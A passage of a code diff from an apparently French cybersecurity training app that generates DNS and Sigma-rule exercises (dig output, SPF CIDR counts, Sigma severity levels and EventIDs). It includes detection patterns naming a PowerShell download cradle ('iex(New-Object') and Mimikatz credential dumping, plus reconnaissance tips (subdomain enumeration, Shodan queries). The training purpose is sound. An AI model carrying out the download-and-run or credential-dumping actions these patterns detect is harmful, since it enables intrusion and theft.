+      ';; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)',
+      `;; WHEN: ${new Date().toUTCString()}`,
+      ';; MSG SIZE  rcvd: ' + (60 + records.length * 30)
+    ];
+    return lines.join('\n');
+  }
 
   function genOSINTDNS() {
-    const qType = rand(0, 6);
-    const opts = { prefix: 'osintdns', icon: '🌐', title: 'OSINT — Infrastructure DNS', badge: 'osint' };
+    const level = rand(0, 2);
+    const opts = { prefix: 'osintdns', icon: '🌐', title: 'DNS — Lecture dig' };
 
-    if (qType === 0) {
-      // Type d'enregistrement DNS
-      const records = [
-        { type: 'A', purpose: 'Résolution nom → adresse IPv4' },
-        { type: 'AAAA', purpose: 'Résolution nom → adresse IPv6' },
-        { type: 'MX', purpose: 'Serveur de messagerie (Mail eXchange) du domaine' },
-        { type: 'TXT', purpose: 'Texte libre (SPF, DKIM, verification, DNS tunneling)' },
-        { type: 'NS', purpose: 'Serveurs DNS faisant autorité sur la zone' },
-        { type: 'CNAME', purpose: 'Alias (Canonical Name) pointant vers un autre nom' },
-        { type: 'SOA', purpose: 'Start of Authority — admin et version de la zone' },
-        { type: 'PTR', purpose: 'Reverse DNS — IP → nom' },
-      ];
-      const target = records[rand(0, records.length - 1)];
-      const others = records.filter(r => r !== target);
-      const distractors = [];
-      while (distractors.length < 3) {
-        distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
-      }
-      const choices = [
-        { text: target.purpose, correct: true,
-          explain: `<strong>${target.type}</strong> : ${target.purpose}. Requête : <code>dig ${target.type} domain.tld</code>.` },
-        ...distractors.map(d => ({
-          text: d.purpose, correct: false,
-          explain: `Ça c'est <strong>${d.type}</strong>, pas ${target.type}.`
-        }))
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau A : extraire l'IP d'un A record ──
+    if (level === 0) {
+      const dom = DNS_DOMAINS[rand(0, DNS_DOMAINS.length - 1)];
+      const ip = dom.ips[0];
+      const digOutput = `$ dig +short ${dom.name} A\n${ip}`;
+
+      const artefactHTML = renderTextBlock(digOutput, {
+        title: `Commande : dig +short ${dom.name} A`,
+        highlights: [{ match: ip, color: '--cyan' }]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `À quoi sert un enregistrement DNS de type <strong>${target.type}</strong> ?`,
-        choices,
-        hintFn: () => `Types DNS courants : A (IPv4), AAAA (IPv6), MX (mail), TXT (libre/SPF/DKIM), NS (autorité), CNAME (alias), SOA (zone admin), PTR (reverse).`
+        badge: 'lecture',
+        artefactHTML,
+        question: `On a interrogé le DNS pour <code>${dom.name}</code> avec <code>dig +short</code>. <strong>Quelle est l'adresse IPv4 qui héberge ce domaine</strong> ?`,
+        inputLabel: 'IP :',
+        placeholder: '93.184.216.34',
+        expected: ip,
+        normalize: v => v.trim().replace(/\s/g, ''),
+        hints: [
+          `<code>dig +short</code> renvoie uniquement les valeurs des records, sans l'en-tête verbeuse. Pour un A record (IPv4), c'est l'adresse IP.`,
+          `La sortie ne contient qu'une seule ligne avec l'IP demandée.`,
+          `IP = <strong>${ip}</strong>. C'est ce que ton navigateur résout quand tu tapes <code>${dom.name}</code>.`
+        ],
+        explain: `<code>${dom.name}</code> → <strong>${ip}</strong>. Pour le reverse : <code>dig -x ${ip}</code> (donne le PTR). Pour creuser : <code>dig +trace ${dom.name}</code> remonte la chaîne depuis les racines.`
       });
     }
 
-    if (qType === 1) {
-      // WHOIS depuis RGPD
-      const choices = [
-        { text: 'Anonymisés/masqués pour les TLD européens depuis le RGPD (mai 2018)', correct: true,
-          explain: `Depuis le <strong>RGPD (mai 2018)</strong>, les registrars européens (et beaucoup d'autres par alignement) masquent les <code>Registrant Name</code>, <code>Email</code>, <code>Address</code> par "REDACTED FOR PRIVACY" ou similaire. Pivots toujours disponibles : <strong>dates de création/expiration, registrar, name servers, statut DNSSEC</strong>. Bases payantes avec historique (whoisxmlapi, DomainTools) peuvent montrer les anciens contacts pré-RGPD.` },
-        { text: 'Toujours accessibles publiquement dans tous les pays', correct: false,
-          explain: `Avant RGPD oui, mais 2018+ : masqués pour les registrars EU et beaucoup d'autres (politique ICANN).` },
-        { text: 'Supprimés définitivement', correct: false,
-          explain: `Les données existent toujours côté registrar — elles sont juste cachées du public WHOIS. Accessibles via procédure judiciaire.` },
-        { text: 'Cryptés en SHA-256', correct: false,
-          explain: `Pas de cryptage : juste masquage textuel ("REDACTED FOR PRIVACY").` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau B : extraire le nom du MX record ──
+    if (level === 1) {
+      const dom = DNS_DOMAINS[rand(0, DNS_DOMAINS.length - 1)];
+      const mxRecords = dom.mx.map((mx, i) => `${10 * (i+1)} ${mx}.`);
+      const digOutput = _genDigOutput({
+        domain: dom,
+        type: 'MX',
+        records: mxRecords
+      });
+
+      const artefactHTML = renderTextBlock(digOutput, {
+        title: `Commande : dig MX ${dom.name}`,
+        highlights: [{ match: ';; ANSWER SECTION:', color: '--gold' }, { match: ' MX ', color: '--gold' }]
+      });
+
+      // Premier MX (priorité la plus basse = la plus haute)
+      const expectedMX = dom.mx[0];
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Les <strong>contacts dans une réponse WHOIS</strong> sont-ils accessibles en 2026 ?`,
-        choices,
-        hintFn: () => `RGPD (mai 2018) → registrars EU masquent Registrant Name/Email. Encore visibles : dates, registrar, name servers, DNSSEC. Historique pré-RGPD parfois disponible chez whoisxmlapi/DomainTools (payant).`
+        badge: 'extraction',
+        artefactHTML,
+        question: `<strong>Quel est le serveur de messagerie principal</strong> (priorité la plus basse = la plus haute) du domaine <code>${dom.name}</code> ?<br><span style="color:var(--dim);font-size:.85rem">Sans le point final.</span>`,
+        inputLabel: 'MX :',
+        placeholder: 'mail.example.com',
+        expected: expectedMX,
+        normalize: v => v.trim().toLowerCase().replace(/\.$/, ''),
+        hints: [
+          `Dans la section <code>ANSWER SECTION</code>, chaque ligne MX a le format : <code>domaine. TTL IN MX &lt;priorité&gt; &lt;hostname&gt;</code>. La priorité la plus basse = serveur principal.`,
+          `Cherche la ligne avec <code>IN MX 10 ...</code> (priorité 10 = la plus prioritaire dans cet output).`,
+          `MX principal = <strong>${expectedMX}</strong>. Priorité 10 (la plus basse parmi les MX listés = serveur préféré).`
+        ],
+        explain: `MX principal de <code>${dom.name}</code> : <strong>${expectedMX}</strong>. Convention : priorité <em>basse</em> = utilisé en premier. ${dom.mx.length > 1 ? 'Les autres MX sont fallback en cas d\'indisponibilité du principal.' : ''} Investigation : croiser avec SPF/DMARC pour valider la légitimité.`
       });
     }
 
-    if (qType === 2) {
-      // Shodan
-      const choices = [
-        { text: '<strong>Shodan</strong> (John Matherly, 2009) — moteur de recherche d\'appareils connectés à Internet', correct: true,
-          explain: `<strong>Shodan</strong> scanne en continu Internet sur les ports communs (80, 443, 22, 3389, 5900 VNC, 502 Modbus, 102 Siemens S7, 161 SNMP, etc.) et indexe les <em>bannières</em>. Recherches : <code>port:5900 country:CH</code> (VNC en Suisse), <code>"Server: Apache" org:"Bank"</code>, <code>cert.subject.cn:example.com</code> (par certificat TLS). Concurrent direct : <strong>Censys</strong> (Université Michigan, 2015), plus orienté certificats TLS.` },
-        { text: 'Google Maps', correct: false,
-          explain: `Google Maps fait de la cartographie géographique, pas du scan réseau.` },
-        { text: 'archive.org', correct: false,
-          explain: `Wayback Machine archive les pages web, pas les bannières de services exposés.` },
-        { text: 'GitHub Search', correct: false,
-          explain: `GitHub indexe du code, pas des appareils Internet.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau C : compter les IPs autorisées par un SPF record ──
+    {
+      const dom = DNS_DOMAINS[rand(0, DNS_DOMAINS.length - 1)];
+      // SPF record avec ip4:X.X.X.X/N
+      const spfPrefix = [24, 28, 29, 30][rand(0, 3)];
+      const spfIPbase = [
+        '195.186.245', '194.6.131', '128.178.222', '212.224.215', '94.142.241'
+      ][rand(0, 4)];
+      const spfIP = `${spfIPbase}.0`;
+      // Nombre d'IPs dans le bloc CIDR
+      const totalIPs = Math.pow(2, 32 - spfPrefix);
+
+      const spfRecord = `"v=spf1 ip4:${spfIP}/${spfPrefix} include:_spf.google.com -all"`;
+      const digOutput = _genDigOutput({
+        domain: dom,
+        type: 'TXT',
+        records: [spfRecord]
+      });
+
+      const artefactHTML = renderTextBlock(digOutput, {
+        title: `Commande : dig TXT ${dom.name}`,
+        highlights: [
+          { match: 'v=spf1', color: '--purple' },
+          { match: ' TXT ', color: '--purple' }
+        ]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Quel service en ligne <strong>cartographie les appareils exposés sur Internet</strong> par scan de ports + banner grabbing ?`,
-        choices,
-        hintFn: () => `Shodan (John Matherly, 2009) et Censys (Michigan, 2015) sont les deux références. Recherche par port, banner, OS, organisation, certificat TLS, géolocalisation IP.`
+        badge: 'calcul',
+        artefactHTML,
+        question: `Le SPF record contient un bloc <code>ip4:${spfIP}/${spfPrefix}</code>. <strong>Combien d'adresses IPv4 ce bloc CIDR couvre-t-il</strong> ?<br><span style="color:var(--dim);font-size:.85rem">(Total brut, sans soustraire network/broadcast.)</span>`,
+        inputLabel: 'Nombre :',
+        placeholder: '256',
+        expected: String(totalIPs),
+        normalize: v => v.trim().replace(/[^\d]/g, ''),
+        hints: [
+          `Un bloc CIDR <code>/N</code> contient <code>2^(32-N)</code> adresses IPv4 (y compris adresse réseau et broadcast).`,
+          `Ici N=${spfPrefix}, donc 2^(32-${spfPrefix}) = 2^${32-spfPrefix}.`,
+          `2^${32-spfPrefix} = <strong>${totalIPs}</strong> adresses IP autorisées par ce bloc SPF.`
+        ],
+        explain: `Bloc <code>/${spfPrefix}</code> = <strong>${totalIPs} IPs</strong> (= 2^${32-spfPrefix}). Le SPF dit "ces ${totalIPs} IPs sont autorisées à envoyer du mail depuis ${dom.name}". ${spfPrefix >= 28 ? 'Plage étroite, OK opérationnellement.' : 'Plage très large — audit recommandé.'} Outils : <code>spfquery</code>, <code>mxtoolbox.com/spf</code>.`
       });
     }
-
-    if (qType === 3) {
-      // Subdomain enumeration
-      const choices = [
-        { text: '<code>amass</code>, <code>subfinder</code>, <code>assetfinder</code> — collecte passive (sources OSINT) + active (DNS bruteforce)', correct: true,
-          explain: `Outils modernes :<br>• <strong>amass</strong> (OWASP) — combine 50+ sources passives + bruteforce + ASN<br>• <strong>subfinder</strong> (ProjectDiscovery) — rapide, passif<br>• <strong>assetfinder</strong> (tomnomnom) — simple, plusieurs sources<br>Sources passives : Certificate Transparency logs (crt.sh, Censys), recherches Google/Bing, VirusTotal, archives, etc. Active : bruteforce de noms (dictionnaires comme <code>SecLists</code>).` },
-        { text: '<code>ping</code> sur chaque sous-domaine possible', correct: false,
-          explain: `Approche naïve qui ne scale pas et rate les sous-domaines non-pingables. Les outils dédiés utilisent des sources OSINT (CT logs, etc.).` },
-        { text: '<code>nslookup -type=SUBDOMAIN</code>', correct: false,
-          explain: `Type DNS <code>SUBDOMAIN</code> n'existe pas. nslookup ne fait pas d'énumération.` },
-        { text: 'Recherche manuelle Google domaine par domaine', correct: false,
-          explain: `Possible (avec dorks comme <code>site:*.target.com</code>) mais incomplet face aux outils automatisés.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quels outils permettent d'<strong>énumérer les sous-domaines</strong> d'une cible en OSINT ?`,
-        choices,
-        hintFn: () => `Modernes : amass (OWASP), subfinder (ProjectDiscovery), assetfinder. Sources passives : Certificate Transparency (crt.sh, Censys), VirusTotal, archives. Active : bruteforce DNS avec wordlists (SecLists).`
-      });
-    }
-
-    if (qType === 4) {
-      // Reverse DNS et PTR
-      const choices = [
-        { text: 'Requête DNS de type <strong>PTR</strong> dans la zone <code>in-addr.arpa</code> (IPv4) ou <code>ip6.arpa</code> (IPv6)', correct: true,
-          explain: `<strong>Reverse DNS</strong> : IP → nom. Mécanisme : zone spéciale <code>X.Y.Z.W.in-addr.arpa</code> (octets <em>inversés</em>). Exemple : pour <code>192.0.2.1</code>, on requête <code>1.2.0.192.in-addr.arpa</code> type PTR. CLI : <code>dig -x 192.0.2.1</code>, <code>nslookup 192.0.2.1</code>, <code>host 192.0.2.1</code>. Souvent pas configuré (PTR retourne NXDOMAIN).` },
-        { text: 'Requête DNS de type A inversée', correct: false,
-          explain: `Pas de type A "inversé". Le reverse DNS utilise PTR dans une zone arpa.` },
-        { text: 'Calcul mathématique sur l\'IP', correct: false,
-          explain: `Pas un calcul : c'est une requête DNS comme une autre (PTR dans la zone in-addr.arpa).` },
-        { text: 'Lecture de la table ARP locale', correct: false,
-          explain: `ARP fait la correspondance MAC ↔ IP sur réseau local, pas IP → nom.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Comment fonctionne le <strong>reverse DNS</strong> (résoudre IP → nom) ?`,
-        choices,
-        hintFn: () => `Requête PTR dans la zone in-addr.arpa (IPv4) ou ip6.arpa (IPv6). Octets inversés. CLI : <code>dig -x 8.8.8.8</code> → "dns.google.". Souvent pas configuré sur des IPs résidentielles ou hébergeurs cheap.`
-      });
-    }
-
-    if (qType === 5) {
-      // DNSSEC
-      const choices = [
-        { text: 'Une <strong>chaîne de signatures cryptographiques</strong> qui authentifie les réponses DNS et empêche le DNS spoofing', correct: true,
-          explain: `<strong>DNSSEC</strong> (DNS Security Extensions, RFC 4033-4035) ajoute des signatures aux enregistrements DNS :<br>• <strong>RRSIG</strong> = signature d'un RRset<br>• <strong>DNSKEY</strong> = clé publique de la zone<br>• <strong>DS</strong> = digest de la DNSKEY du fils, signé par le parent<br>• <strong>NSEC/NSEC3</strong> = preuve de non-existence<br>Chaîne de confiance depuis la racine signée (.). Vérification : <code>dig +dnssec example.com</code>. Sans DNSSEC : DNS cache poisoning trivial.` },
-        { text: 'Le chiffrement TLS du DNS (DoH/DoT)', correct: false,
-          explain: `Faux ! DNSSEC = authentification (signatures), pas chiffrement. Le chiffrement DNS = <strong>DoH</strong> (DNS over HTTPS, RFC 8484) ou <strong>DoT</strong> (DNS over TLS, RFC 7858) — concepts distincts mais complémentaires.` },
-        { text: 'Un pare-feu DNS payant', correct: false,
-          explain: `DNSSEC est un standard ouvert, pas un produit commercial.` },
-        { text: 'L\'obfuscation des requêtes DNS', correct: false,
-          explain: `DNSSEC n'obfusque rien — les requêtes restent en clair (sauf si combiné à DoH/DoT). Authentification, pas masquage.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Qu'est-ce que <strong>DNSSEC</strong> ?`,
-        choices,
-        hintFn: () => `DNSSEC = signatures (RRSIG, DNSKEY, DS, NSEC). Authentification, pas chiffrement. Distinct de DoH/DoT (chiffrement). Racine . signée en 2010. Chaîne de confiance jusqu'à la racine.`
-      });
-    }
-
-    // qType === 6 : Certificate Transparency
-    const choices = [
-      { text: '<strong>Certificate Transparency</strong> (RFC 6962) — logs publics de tous les certs TLS émis, sources : crt.sh, Censys', correct: true,
-        explain: `<strong>CT</strong> (Certificate Transparency) impose aux CA publiques de logger chaque certificat émis dans des <em>logs append-only</em> publics. Depuis Chrome 68 (2018), un cert sans <em>SCT</em> (Signed Certificate Timestamp) est marqué "Not Secure". OSINT : <strong>crt.sh</strong> permet la recherche par nom de domaine et révèle TOUS les sous-domaines pour lesquels la cible a obtenu un cert (incluant ceux non publics dans le DNS) → mine d'or pour la reco.` },
-      { text: 'Un cache local Windows', correct: false,
-        explain: `Le cache local Windows liste les certs validés sur la machine, pas tous les certs émis dans le monde.` },
-      { text: 'La base de Google Search', correct: false,
-        explain: `Google indexe les pages web, pas les certificats émis par les CA.` },
-      { text: 'Le keychain macOS', correct: false,
-        explain: `Le keychain stocke les certs locaux de la machine, sans rapport avec CT.` },
-    ].sort(() => Math.random() - 0.5);
-    return buildQCMCard({
-      ...opts,
-      scenario: `Quelle source OSINT permet de <strong>découvrir tous les sous-domaines</strong> pour lesquels une cible a obtenu un certificat TLS ?`,
-      choices,
-      hintFn: () => `Certificate Transparency (CT, RFC 6962). Logs append-only publics. crt.sh permet la recherche par nom : <code>crt.sh/?q=example.com</code> → tous les certs émis incluant sous-domaines techniques (dev.*, staging.*, internal.*). Censys et Google CT logs aussi.`
-    });
   }
 
   // ════════════════════════════════════════════════════════════════
-  // TP 3 : Sigma Rules
+  // TP 3 : Sigma — Règles YAML à compléter
   // ════════════════════════════════════════════════════════════════
 
   function genSigma() {
-    const qType = rand(0, 6);
-    const opts = { prefix: 'sigma', icon: '🛡️', title: 'Sigma Rules & Detection Engineering', badge: 'detect' };
+    const level = rand(0, 2);
+    const opts = { prefix: 'sigma', icon: '🛡️', title: 'Sigma — Compléter une règle YAML' };
 
-    if (qType === 0) {
-      // Format Sigma
-      const choices = [
-        { text: '<strong>YAML</strong> structuré, indépendant du SIEM cible', correct: true,
-          explain: `Sigma est écrit en <strong>YAML</strong> (clés/valeurs hiérarchiques). Conçu par <strong>Florian Roth</strong> (Nextron Systems) en 2017. Une règle Sigma se <em>compile</em> vers le langage natif du SIEM cible : Splunk SPL, Elastic ESQL/EQL, Microsoft Sentinel KQL, QRadar AQL, etc. Repo officiel : <code>SigmaHQ/sigma</code> sur GitHub (3000+ règles communautaires).` },
-        { text: 'JSON Schema', correct: false,
-          explain: `Faux. Sigma utilise YAML (qui peut être converti en JSON mais le format canonique est YAML).` },
-        { text: 'XML', correct: false,
-          explain: `Pas XML. YAML.` },
-        { text: 'Binaire propriétaire', correct: false,
-          explain: `Open source, format texte (YAML) lisible.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Sous quel <strong>format</strong> les règles Sigma sont-elles écrites ?`,
-        choices,
-        hintFn: () => `YAML structuré (Florian Roth, 2017, SigmaHQ). Indépendant SIEM : compilé vers SPL/EQL/KQL/AQL avec sigma-cli. Lisible humain, versionnable Git.`
-      });
-    }
-
-    if (qType === 1) {
-      // Bloc detection / condition
-      const choices = [
-        { text: 'Des <strong>selections</strong> (filtrant des champs) combinées par une <strong>condition</strong> booléenne', correct: true,
-          explain: `Structure d'un bloc detection :<br><pre>detection:
-  selection_1:
-    EventID: 4688
-    Image|endswith: '\\powershell.exe'
-  filter:
-    User: 'NT AUTHORITY\\SYSTEM'
-  condition: selection_1 and not filter</pre>Les <em>selections</em> matchent un ensemble de critères. Le <code>condition:</code> les combine avec <code>and</code>, <code>or</code>, <code>not</code>, <code>1 of</code>, <code>all of</code>.` },
-        { text: 'Le hash SHA-256 du malware à détecter', correct: false,
-          explain: `Les hashes peuvent être dans une selection (<code>Hashes|contains: ...</code>) mais le bloc detection est structurel, pas un hash isolé.` },
-        { text: 'L\'IP du C2', correct: false,
-          explain: `Peut figurer dans une selection (<code>DestinationIp: ...</code>) mais ce n'est pas le contenu structurel du bloc.` },
-        { text: 'Le nom de l\'auteur', correct: false,
-          explain: `L'auteur est dans le champ métadonnée <code>author:</code>, pas dans <code>detection:</code>.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Que contient le bloc <code>detection:</code> d'une règle Sigma ?`,
-        choices,
-        hintFn: () => `<code>detection:</code> contient des <em>selections</em> (filtres sur champs : EventID, Image, CommandLine, User, etc.) combinées par <code>condition:</code> avec opérateurs and/or/not.`
-      });
-    }
-
-    if (qType === 2) {
-      // Modifiers
-      const choices = [
-        { text: '<strong>|contains</strong>, <strong>|endswith</strong>, <strong>|startswith</strong>, <strong>|re</strong>, <strong>|all</strong>, <strong>|base64</strong>', correct: true,
-          explain: `Modificateurs Sigma (suffixes après <code>|</code>) :<br>• <code>|contains</code> : substring<br>• <code>|startswith</code>, <code>|endswith</code> : prefixe/suffixe<br>• <code>|re</code> : regex<br>• <code>|all</code> : tous les éléments de la liste doivent matcher (au lieu de "n'importe lequel" par défaut)<br>• <code>|base64</code> : décode base64 avant comparaison<br>• <code>|cidr</code> : match d'IP dans une plage CIDR<br>Exemple : <code>CommandLine|contains: 'iex(New-Object'</code>.` },
-        { text: '<code>like</code>, <code>match</code>, <code>has</code> uniquement', correct: false,
-          explain: `Pas la syntaxe Sigma. Les modificateurs commencent par <code>|</code>.` },
-        { text: 'Aucun, on doit toujours faire match exact', correct: false,
-          explain: `Faux. Les modifiers (<code>|contains</code> etc.) sont une fonctionnalité clé qui rend Sigma expressif.` },
-        { text: 'Uniquement <code>==</code> et <code>!=</code>', correct: false,
-          explain: `Sigma utilise YAML, donc <code>:</code> pour la clé-valeur. Pas d'opérateurs <code>==/!=</code> directs.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quels <strong>modificateurs</strong> (modifiers) Sigma permettent des matches non-exacts ?`,
-        choices,
-        hintFn: () => `Modifiers Sigma : <code>|contains</code>, <code>|startswith</code>, <code>|endswith</code>, <code>|re</code> (regex), <code>|all</code> (tous au lieu de n'importe lequel), <code>|base64</code>, <code>|cidr</code>. Syntaxe : <code>Champ|modifier: valeur</code>.`
-      });
-    }
-
-    if (qType === 3) {
-      // Level
-      const choices = [
-        { text: '<code>informational</code>, <code>low</code>, <code>medium</code>, <code>high</code>, <code>critical</code>', correct: true,
-          explain: `Le champ <code>level:</code> d'une règle Sigma utilise 5 niveaux : <strong>informational</strong> (observation, peu actionable), <strong>low</strong>, <strong>medium</strong>, <strong>high</strong>, <strong>critical</strong>. Utilisé par le SIEM pour prioriser les alertes. Bonne pratique : ne pas surutiliser "critical" (réservé à du clairement malveillant : Mimikatz, exécution de commande dump SAM, etc.).` },
-        { text: '<code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, <code>5</code>', correct: false,
-          explain: `Sigma utilise des chaînes verbales (informational, low, medium, high, critical), pas des entiers.` },
-        { text: '<code>P1</code> à <code>P5</code>', correct: false,
-          explain: `Pas la convention Sigma. Certains SIEM internes utilisent P1-P5, mais Sigma utilise les 5 niveaux verbaux.` },
-        { text: '<code>red</code>, <code>orange</code>, <code>yellow</code>, <code>green</code>', correct: false,
-          explain: `Couleurs utilisées dans certains dashboards, mais pas le champ <code>level:</code> de Sigma.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quels sont les <strong>niveaux de sévérité</strong> (<code>level:</code>) prévus par Sigma ?`,
-        choices,
-        hintFn: () => `5 niveaux : informational, low, medium, high, critical. Choisir en fonction de la confiance (faux positifs ?) ET de l'impact si vrai positif. Critical = malveillant clair (Mimikatz, lsass dump, ransomware enum).`
-      });
-    }
-
-    if (qType === 4) {
-      // Source de logs
-      const sources = [
-        { product: 'windows', service: 'security', usage: 'Windows Security.evtx (4624, 4625, 4688, etc.)' },
-        { product: 'windows', service: 'sysmon', usage: 'Sysmon Events (1, 3, 7, 11, 13...)' },
-        { product: 'windows', service: 'powershell', usage: 'PowerShell Script Block (4104)' },
-        { product: 'linux', service: 'auditd', usage: 'auditd logs Linux (syscalls audit)' },
-        { product: 'macos', service: 'unified', usage: 'macOS Unified Log' },
-        { product: 'aws', service: 'cloudtrail', usage: 'AWS CloudTrail API calls' },
+    // ── Niveau A : niveau de sévérité (level:) à deviner depuis le contexte ──
+    if (level === 0) {
+      const scenarios = [
+        {
+          name: 'Mimikatz exec detected',
+          desc: 'Detects execution of mimikatz.exe — credential dumping tool',
+          ttp: 'attack.t1003.001',
+          tactic: 'attack.credential_access',
+          level: 'critical'
+        },
+        {
+          name: 'Rare scheduled task with random name',
+          desc: 'Scheduled task with high-entropy random name (potential persistence)',
+          ttp: 'attack.t1053.005',
+          tactic: 'attack.persistence',
+          level: 'high'
+        },
+        {
+          name: 'Office spawning cmd.exe',
+          desc: 'Microsoft Office (Word/Excel) spawning cmd.exe — possible macro abuse',
+          ttp: 'attack.t1059.003',
+          tactic: 'attack.execution',
+          level: 'high'
+        },
+        {
+          name: 'New service installed',
+          desc: 'Audit : a new Windows service was installed (informational, may be benign)',
+          ttp: 'attack.t1543.003',
+          tactic: 'attack.persistence',
+          level: 'medium'
+        },
+        {
+          name: 'Successful logon outside business hours',
+          desc: 'Successful logon (4624) between 22:00 and 06:00 — may need review',
+          ttp: 'attack.t1078',
+          tactic: 'attack.initial_access',
+          level: 'low'
+        }
       ];
-      const target = sources[rand(0, sources.length - 1)];
-      const others = sources.filter(s => s !== target);
-      const distractors = [];
-      while (distractors.length < 3) {
-        distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
-      }
-      const choices = [
-        { text: target.usage, correct: true,
-          explain: `<code>logsource:<br>  product: ${target.product}<br>  service: ${target.service}</code> cible <strong>${target.usage}</strong>.` },
-        ...distractors.map(d => ({
-          text: d.usage, correct: false,
-          explain: `Ça correspond à <code>logsource: product: ${d.product}, service: ${d.service}</code>, pas ${target.service}.`
-        }))
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+      const s = scenarios[rand(0, scenarios.length - 1)];
+      const yaml = `title: ${s.name}
+id: ${'01234567-89ab-cdef-0123-456789abcdef'.split('').map(c => c === '0' || c === '1' ? c : '0123456789abcdef'[rand(0,15)]).join('').slice(0,8)}-...
+status: experimental
+description: ${s.desc}
+author: CAS-IN
+date: 2025/09/12
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4688
+    Image|endswith: '\\suspicious_binary.exe'
+  condition: selection
+tags:
+  - ${s.ttp}
+  - ${s.tactic}
+falsepositives:
+  - Legitimate admin activity
+level: ???`;
+
+      const artefactHTML = renderTextBlock(yaml, {
+        title: 'Règle Sigma — détection.yml',
+        highlights: [
+          { match: 'description:', color: '--cyan' },
+          { match: 'level:', color: '--cyan' }
+        ]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Une règle Sigma a <code>logsource:<br>  product: ${target.product}<br>  service: ${target.service}</code>. Quels logs cible-t-elle ?`,
-        choices,
-        hintFn: () => `Logsources Sigma courants : windows/security (4624 etc.), windows/sysmon (1/3/7), windows/powershell (4104), linux/auditd, macos/unified, aws/cloudtrail, gcp/audit, azure/signinlogs. Le champ logsource conditionne la compilation vers le SIEM.`
+        badge: 'identification',
+        artefactHTML,
+        question: `Cette règle Sigma a son champ <code>level</code> manquant (<code>???</code>). En te basant sur la <code>description</code> et le tag MITRE, <strong>quel niveau de sévérité</strong> est le plus approprié ?<br><span style="color:var(--dim);font-size:.85rem">Valeurs Sigma : <code>informational</code> / <code>low</code> / <code>medium</code> / <code>high</code> / <code>critical</code></span>`,
+        inputLabel: 'level :',
+        placeholder: 'high',
+        expected: s.level,
+        normalize: v => v.trim().toLowerCase(),
+        hints: [
+          `Sigma définit 5 niveaux croissants : <code>informational</code> &lt; <code>low</code> &lt; <code>medium</code> &lt; <code>high</code> &lt; <code>critical</code>. Le choix dépend de l'<strong>impact si vrai positif</strong> ET de la <strong>confiance</strong>.`,
+          `Ici : "${s.desc}". Cherche dans les conventions Sigma — un acte de credential dump (Mimikatz) = critical ; une persistence inhabituelle = high ; un audit informatif = medium ; une simple anomalie horaire = low.`,
+          `Réponse : <strong>${s.level}</strong>. Critère : <code>${s.name}</code> = ${s.level === 'critical' ? 'malveillance certaine et impact maximal' : s.level === 'high' ? 'forte suspicion de malveillance' : s.level === 'medium' ? 'observation à investiguer' : 'signal faible / faux positifs probables'}.`
+        ],
+        explain: `<strong>level: ${s.level}</strong>. Règle pratique : <code>critical</code> = action malveillante claire (Mimikatz, ransomware enum) ; <code>high</code> = pattern d'attaque ; <code>medium</code> = audit/observation ; <code>low</code> = anomalie possible mais nombreux faux positifs.`
       });
     }
 
-    if (qType === 5) {
-      // sigma-cli compile
-      const choices = [
-        { text: '<code>sigma-cli</code> (anciennement <code>sigmac</code>) — convertit YAML vers SPL/EQL/KQL/etc.', correct: true,
-          explain: `Le compilateur officiel <strong>sigma-cli</strong> (Python, pip install sigma-cli) remplace l'ancien <code>sigmac</code>. Usage : <code>sigma convert -t splunk rule.yml</code> → produit la requête SPL équivalente. Cibles supportées : splunk, esql, eql, kql (Sentinel), grep, AWS CloudWatch, etc. Pour exécuter en live sur des EVTX : <strong>chainsaw</strong> (WithSecure, en Rust) applique des règles Sigma directement sur des fichiers EVTX.` },
-        { text: 'gcc', correct: false,
-          explain: `gcc compile du C, pas du Sigma.` },
-        { text: 'Logstash', correct: false,
-          explain: `Logstash transforme des logs en pipeline ELK, ne convertit pas Sigma.` },
-        { text: 'PowerShell ISE', correct: false,
-          explain: `Éditeur de scripts PowerShell, sans rapport.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau B : numéro d'EventID à compléter ──
+    if (level === 1) {
+      const eventScenarios = [
+        { id: 4624, what: 'Successful logon — track user logons' },
+        { id: 4625, what: 'Failed logon — detect brute force' },
+        { id: 4634, what: 'Logoff — track session end' },
+        { id: 4648, what: 'Logon with explicit credentials (runas) — privilege misuse' },
+        { id: 4672, what: 'Special privileges assigned — admin token usage' },
+        { id: 4688, what: 'Process creation — detect suspicious binaries' },
+        { id: 4720, what: 'New user account created — persistence detection' },
+        { id: 4732, what: 'User added to local security-enabled group — privilege escalation' }
+      ];
+      const evt = eventScenarios[rand(0, eventScenarios.length - 1)];
+      const yaml = `title: ${evt.what.split('—')[0].trim()}
+status: stable
+description: ${evt.what}
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: ???
+  condition: selection
+level: medium`;
+
+      const artefactHTML = renderTextBlock(yaml, {
+        title: 'Règle Sigma — détection.yml',
+        highlights: [
+          { match: 'description:', color: '--gold' },
+          { match: 'EventID:', color: '--gold' }
+        ]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Quel outil <strong>compile</strong> une règle Sigma YAML vers le langage natif d'un SIEM ?`,
